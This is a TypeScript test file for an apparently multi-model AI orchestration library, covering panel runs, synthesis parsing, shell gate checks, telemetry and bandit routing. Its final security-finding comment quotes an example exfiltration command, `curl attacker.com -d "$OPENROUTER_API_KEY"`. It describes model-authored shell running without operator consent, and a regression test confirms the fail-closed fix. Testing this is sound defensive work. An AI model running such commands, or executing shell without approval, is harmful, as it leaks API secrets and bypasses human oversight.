/**
 * P3 fusion core tests (scope §4). Deterministic + offline: every model call
 * is a scripted faux-provider response; gate checks are safe shell one-liners
 * (`true`, `false`, `test -f`) run inside a `node:fs.mkdtemp` temp dir.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm, writeFile, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import { createModels } from "@earendil-works/pi-ai";
import type {
  Api,
  AssistantMessageEventStream,
  Context,
  Model,
  StreamFunction,
} from "@earendil-works/pi-ai";
import {
  fauxAssistantMessage,
  fauxProvider,
  fauxText,
  type FauxProviderHandle,
} from "@earendil-works/pi-ai/providers/faux";

import {
  AttributionError,
  FusionBandit,
  GateHaltError,
  WeakGateError,
  fuse,
  readFusionRuns,
  recordFusionRun,
  runGatedFusion,
  runPanel,
  runSynthesis,
  shouldFuse,
  summariseFusionRuns,
  type FusionRunRecord,
} from "openkai-core";

interface FauxRig {
  streamFn: StreamFunction;
  model: Model<Api>;
  faux: FauxProviderHandle;
}

/** A faux provider + model + streamFn, scripted by system-prompt routing. */
function makeRig(route: (system: string, callCount: number) => string): FauxRig {
  const faux = fauxProvider({});
  // Each stream call shifts one queued step — queue a bounded run of the
  // same routing factory so every call in the run is served.
  const factory = (context: Context, _options: unknown, state: { callCount: number }) => {
    const text = route(context.systemPrompt ?? "", state.callCount);
    return fauxAssistantMessage([fauxText(text)]);
  };
  faux.setResponses(Array.from({ length: 16 }, () => factory));
  const models = createModels();
  models.setProvider(faux.provider);
  const model = models.getModel("faux", "faux-1");
  assert.ok(model, "faux-1 registered");
  const streamFn: StreamFunction = (m, ctx, opts): AssistantMessageEventStream =>
    models.streamSimple(m, ctx, opts);
  return { streamFn, model, faux };
}

const SYNTHESIS_JSON = JSON.stringify({
  consensus: ["both agree on the shape"],
  divergences: [
    {
      topic: "error style",
      architect: "structured codes",
      builder: "plain messages",
      kept: "architect",
    },
  ],
  discarded: [{ item: "global mutable state", reason: "untestable", by: "builder" }],
  blindSpots: ["no retry budget"],
});

test("panel: architect and builder run as separate sessions, role-attributed", async () => {
  const rig = makeRig((system) =>
    system.includes("ARCHITECT") ? "architect plan" : "builder deliverable",
  );
  const outputs = await runPanel(rig.streamFn, {
    task: "design a thing",
    architectModel: rig.model,
    builderModel: rig.model,
  });
  assert.equal(outputs.length, 2);
  const architect = outputs.find((o) => o.role === "architect");
  const builder = outputs.find((o) => o.role === "builder");
  assert.equal(architect?.text, "architect plan");
  assert.equal(builder?.text, "builder deliverable");
  assert.ok(architect && builder && architect.latencyMs >= 0 && builder.latencyMs >= 0);
});

test("synthesis: parses the structured merge with attribution intact", async () => {
  const rig = makeRig(() => SYNTHESIS_JSON);
  const synthesis = await runSynthesis(rig.streamFn, rig.model, "task", [
    { role: "architect", modelId: "faux-1", text: "A", usage: undefined, latencyMs: 1 },
    { role: "builder", modelId: "faux-1", text: "B", usage: undefined, latencyMs: 1 },
  ]);
  assert.deepEqual(synthesis.consensus, ["both agree on the shape"]);
  assert.equal(synthesis.divergences[0]?.kept, "architect");
  assert.equal(synthesis.discarded[0]?.by, "builder");
  assert.deepEqual(synthesis.blindSpots, ["no retry budget"]);
});

test("synthesis: unattributed divergence throws AttributionError", async () => {
  const bad = JSON.stringify({
    consensus: [],
    divergences: [{ topic: "x", architect: "", builder: "", kept: "both" }],
    discarded: [],
    blindSpots: [],
  });
  const rig = makeRig(() => bad);
  await assert.rejects(
    runSynthesis(rig.streamFn, rig.model, "task", [
      { role: "architect", modelId: "faux-1", text: "A", usage: undefined, latencyMs: 1 },
      { role: "builder", modelId: "faux-1", text: "B", usage: undefined, latencyMs: 1 },
    ]),
    (error: unknown) => error instanceof AttributionError,
  );
});

test("gate: all-green baseline throws WeakGateError carrying the baseline run", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "openkai-fusion-"));
  try {
    await assert.rejects(
      runGatedFusion({
        checks: [{ name: "trivially green", command: "true" }],
        cwd,
        initialWork: "work",
        repairWork: async () => "work",
      }),
      (error: unknown) =>
        error instanceof WeakGateError &&
        error.runs.length === 1 &&
        error.runs[0]?.purpose === "baseline" &&
        error.runs[0].pass,
    );
  } finally {
    await rm(cwd, { recursive: true, force: true });
  }
});

test("gate: full repair loop passes once applyWork materialises the work", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "openkai-fusion-"));
  const marker = path.join(cwd, "marker.txt");
  try {
    const { runs, finalWork } = await runGatedFusion({
      checks: [{ name: "marker exists", command: `test -f "${marker}"` }],
      cwd,
      initialWork: "the deliverable",
      applyWork: () => {
        void writeFile(marker, "done");
      },
      repairWork: async () => "repaired",
    });
    assert.equal(finalWork, "the deliverable");
    assert.equal(runs.length, 2);
    assert.equal(runs[0]?.purpose, "baseline");
    assert.equal(runs[0]?.pass, false);
    assert.equal(runs[1]?.purpose, "evaluation");
    assert.equal(runs[1]?.pass, true);
  } finally {
    await rm(cwd, { recursive: true, force: true });
  }
});

test("gate: cap reached halts loudly with verbatim failures and full run history", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "openkai-fusion-"));
  try {
    let repairs = 0;
    await assert.rejects(
      runGatedFusion({
        checks: [{ name: "never green", command: "false" }],
        cwd,
        maxRounds: 2,
        initialWork: "v1",
        applyWork: () => undefined,
        repairWork: async (failures) => {
          repairs += 1;
          assert.match(failures, /FAIL never green/);
          return `v${repairs + 1}`;
        },
      }),
      (error: unknown) => {
        assert.ok(error instanceof GateHaltError);
        // 1 baseline + 2 evaluations; repair ran exactly once (rounds - 1).
        assert.equal(error.runs.length, 3);
        assert.equal(repairs, 1);
        assert.match(error.message, /escalating to triage/);
        return true;
      },
    );
  } finally {
    await rm(cwd, { recursive: true, force: true });
  }
});

test("fuse (ungated): panel + synthesis + telemetry record in one call", async () => {
  const rig = makeRig((system) => {
    // Order matters: the synthesis prompt mentions both role names.
    if (system.includes("SYNTHESISER")) return SYNTHESIS_JSON;
    if (system.includes("ARCHITECT role")) return "architect position";
    return "builder position";
  });
  const result = await fuse(rig.streamFn, {
    task: "fused task",
    architectModel: rig.model,
    builderModel: rig.model,
  });
  assert.equal(result.outputs.length, 2);
  assert.equal(result.synthesis.divergences.length, 1);
  assert.equal(result.gate.outcome, "not-run");
  assert.equal(result.record.task, "fused task");
  assert.equal(result.record.gated, false);
  assert.ok(result.runId.length > 0);
});

test("telemetry: record + read round-trips through the runs log", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "openkai-fusion-"));
  const logPath = path.join(cwd, "runs.jsonl");
  const record: FusionRunRecord = {
    runId: "test-run-1",
    ts: new Date().toISOString(),
    task: "t",
    gated: false,
    roles: [],
    synthesis: undefined,
    gate: { rounds: 0, outcome: "not-run" },
    wallMs: 1,
  };
  try {
    await recordFusionRun(record, logPath);
    const runs = await readFusionRuns(logPath);
    assert.equal(runs.length, 1);
    assert.equal(runs[0]?.runId, "test-run-1");
  } finally {
    await rm(cwd, { recursive: true, force: true });
  }
});

// ── P3b: FU-4 policy + FU-5 aggregation ────────────────────────────────────

test("policy: explicit force wins over every other rule", () => {
  const decision = shouldFuse({ force: true, priority: "low", taskClass: "routine" });
  assert.equal(decision.fuse, true);
  assert.match(decision.reason, /explicit/);
});

test("policy: urgent priority fuses without any other signal", () => {
  const decision = shouldFuse({ priority: "urgent" });
  assert.equal(decision.fuse, true);
  assert.match(decision.reason, /urgent/);
});

test("policy: high-priority architecture fuses; medium-priority does not", () => {
  assert.equal(
    shouldFuse({ priority: "high", taskClass: "architecture" }).fuse,
    true,
  );
  assert.equal(
    shouldFuse({ priority: "medium", taskClass: "architecture" }).fuse,
    false,
  );
});

test("policy: routine work never fuses on class, breadth triggers at threshold", () => {
  assert.equal(
    shouldFuse({ priority: "high", taskClass: "routine" }).fuse,
    false,
  );
  assert.equal(shouldFuse({ filesBreadth: 9 }).fuse, false);
  const at = shouldFuse({ filesBreadth: 10 });
  assert.equal(at.fuse, true);
  assert.match(at.reason, /blast radius/);
});

test("policy: bare invocation takes the cheap single-model default", () => {
  const decision = shouldFuse({});
  assert.equal(decision.fuse, false);
  assert.match(decision.reason, /single-model/);
});

test("report: summariseFusionRuns aggregates per pair with gate rate and tokens", async () => {

  const role = (r: "architect" | "builder", modelId: string, totalTokens: number) => ({
    role: r,
    modelId,
    text: "",
    usage: {
      input: 0,
      output: 0,
      cacheRead: 0,
      cacheWrite: 0,
      cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 },
      totalTokens,
    },
    latencyMs: 100,
  });
  const run = (runId: string, outcome: "pass" | "halt"): FusionRunRecord => ({
    runId,
    ts: new Date().toISOString(),
    task: "t",
    gated: true,
    roles: [role("architect", "m-a", 10), role("builder", "m-b", 20)],
    synthesis: { modelId: "m-a", usage: undefined },
    gate: { rounds: 1, outcome },
    wallMs: 1000,
  });
  const stats = summariseFusionRuns([run("r1", "pass"), run("r2", "halt")]);
  assert.equal(stats.length, 1);
  const s = stats[0];
  assert.equal(s?.runs, 2);
  assert.equal(s?.gatePassRate, 0.5);
  assert.equal(s?.totalTokens, 60);
  assert.equal(s?.avgWallMs, 1000);
  assert.match(s?.pair ?? "", /architect:m-a/);
});

// ── Inc 07 partial: Beta-bandit routing (per-complexity priors) ────────────

const banditRun = (
  runId: string,
  modelId: string,
  outcome: "pass" | "halt",
): FusionRunRecord => ({
  runId,
  ts: new Date().toISOString(),
  task: "t",
  gated: true,
  roles: [
    { role: "architect", modelId, text: "", usage: undefined, latencyMs: 1 },
  ],
  synthesis: undefined,
  gate: { rounds: 1, outcome },
  wallMs: 1,
});

test("bandit: per-bucket evidence beats a globally-better model in its weak bucket", () => {
  // model-strong wins high-complexity 8/8; model-weak loses high 1/7 but
  // dominates low 8/8. In the high bucket the bandit must route strong.
  const records: FusionRunRecord[] = [
    ...Array.from({ length: 8 }, (_, i) => banditRun(`s-high-${i}`, "model-strong", "pass")),
    ...Array.from({ length: 7 }, (_, i) => banditRun(`w-high-${i}`, "model-weak", "halt")),
    banditRun("w-high-p", "model-weak", "pass"),
    ...Array.from({ length: 8 }, (_, i) => banditRun(`w-low-${i}`, "model-weak", "pass")),
  ];
  const bandit = new FusionBandit(42);
  bandit.update(records, (r) => (r.runId.includes("high") ? "high" : "low"));
  const high = bandit.recommend("high", ["model-strong", "model-weak"]);
  assert.equal(high?.modelId, "model-strong");
  assert.match(high?.reason ?? "", /bucket evidence 8 pass/);
});

test("bandit: failures in one bucket do not suppress a model globally", () => {
  // model-x fails low constantly but is undefeated in high.
  const records: FusionRunRecord[] = [
    ...Array.from({ length: 6 }, (_, i) => banditRun(`x-low-${i}`, "model-x", "halt")),
    ...Array.from({ length: 6 }, (_, i) => banditRun(`x-high-${i}`, "model-x", "pass")),
  ];
  const bandit = new FusionBandit(7);
  bandit.update(records, (r) => (r.runId.includes("high") ? "high" : "low"));
  const high = bandit.recommend("high", ["model-x"]);
  assert.match(high?.reason ?? "", /bucket evidence 6 pass \/ 0 fail/);
});

test("bandit: unseen bucket starts from the global posterior, not zero", () => {
  const records = Array.from({ length: 5 }, (_, i) =>
    banditRun(`m-${i}`, "model-y", "pass"),
  );
  const bandit = new FusionBandit(3);
  bandit.update(records, () => "low");
  const rec = bandit.recommend("medium", ["model-y"]);
  assert.match(rec?.reason ?? "", /global evidence 5 pass.*bucket unseen/);
});

test("bandit: ungated runs carry no verdict and are ignored", () => {
  const ungated: FusionRunRecord = {
    runId: "u1",
    ts: new Date().toISOString(),
    task: "t",
    gated: false,
    roles: [{ role: "builder", modelId: "model-z", text: "", usage: undefined, latencyMs: 1 }],
    synthesis: undefined,
    gate: { rounds: 0, outcome: "not-run" },
    wallMs: 1,
  };
  const bandit = new FusionBandit(1);
  bandit.update([ungated], () => "low");
  const rec = bandit.recommend("low", ["model-z"]);
  assert.match(rec?.reason ?? "", /no evidence/);
});

// ── E001 §2 re-review fixes: terminal sanitiser + gate consent ─────────────

test("gate consent: refused approval skips execution entirely (outcome refused)", async () => {
  const rig = makeRig((system) => {
    if (system.includes("VALIDATOR")) {
      return JSON.stringify([{ name: "probe", command: "true" }]);
    }
    if (system.includes("SYNTHESISER")) return SYNTHESIS_JSON;
    if (system.includes("ARCHITECT role")) return "A";
    return "B";
  });
  const result = await fuse(rig.streamFn, {
    task: "gated task",
    architectModel: rig.model,
    builderModel: rig.model,
    gate: true,
    approveGate: () => false,
  });
  assert.equal(result.gate.outcome, "refused");
  assert.equal(result.gateRuns.length, 0, "no gate check may execute without consent");
  assert.equal(result.outputs.length, 0, "a refused gate aborts the run before the panel");
});

test("gate consent: approval lets the designed gate run", async () => {
  const rig = makeRig((system) => {
    if (system.includes("VALIDATOR")) {
      return JSON.stringify([{ name: "fails at baseline", command: "false" }]);
    }
    if (system.includes("SYNTHESISER")) return SYNTHESIS_JSON;
    if (system.includes("ARCHITECT role")) return "A";
    return "B";
  });
  const result = await fuse(rig.streamFn, {
    task: "gated task",
    architectModel: rig.model,
    builderModel: rig.model,
    gate: true,
    approveGate: () => true,
  });
  // Baseline fails RED (command `false`), evaluation fails, no applyWork → halt.
  assert.equal(result.gate.outcome, "halt");
  assert.ok(result.gateRuns.length >= 2, "baseline + evaluation executed with consent");
});

/**
 * FINDING 9 (MEDIUM, LIVE — latent) — E001 §2 re-review, cole@openkai.
 *
 * `approveGate` is OPTIONAL and absent means "consent given": the guard is
 * `if (checks && options.approveGate)`. A caller that designs a gate but omits
 * the callback therefore executes MODEL-AUTHORED shell with no operator
 * approval — via `spawnSync(command, { shell: true, env: { ...process.env } })`,
 * so the child also inherits every secret the CLI loaded from `.env`.
 *
 * Only `packages/cli/src/fuse.ts` wires consent. The TUI's `/fuse`
 * (`runtime.ts` → `fuse({ task, architectModel, builderModel })`) does not, and
 * is safe today ONLY because it never sets `gate: true` — one line away from
 * unconsented execution. The engine's posture for the same risk is the
 * inverse and fail-safe: "bash can never be auto-allowed".
 *
 * INVERTED (2026-08-16, F9 fix): with checks designed and no consent channel,
 * the outcome must be "refused" and `gateRuns` must stay empty — the gate
 * fails closed, model-authored shell never executes.
 */
test("REPRO 9 (fusion): a designed gate with NO consent channel is refused (fail-closed)", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "openkai-consent-"));
  const marker = path.join(cwd, "executed-without-consent.txt");
  try {
    const rig = makeRig((system) => {
      if (system.includes("VALIDATOR")) {
        // A benign stand-in for `curl attacker.com -d "$OPENROUTER_API_KEY"`:
        // proving execution is enough; exfiltration needs no extra privilege.
        return JSON.stringify([
          { name: "side effect", command: `printf pwned > ${JSON.stringify(marker)}` },
        ]);
      }
      if (system.includes("SYNTHESISER")) return SYNTHESIS_JSON;
      if (system.includes("ARCHITECT role")) return "A";
      return "B";
    });

    const result = await fuse(rig.streamFn, {
      task: "gated task",
      architectModel: rig.model,
      builderModel: rig.model,
      gate: true,
      cwd,
      // approveGate deliberately omitted — the TUI's call shape.
    });

    // FIXED (F9): absent consent channel → refusal, no execution.
    assert.equal(result.gate.outcome, "refused", "FIXED: no consent channel refuses the gate");
    assert.equal(result.gateRuns.length, 0, "FIXED: no gate checks executed without consent");
    // The model's command never ran — the marker must not exist.
    await assert.rejects(
      () => readFile(marker, "utf-8"),
      /ENOENT/,
      "FIXED: model-authored shell produced no side effect",
    );
  } finally {
    await rm(cwd, { recursive: true, force: true });
  }
});
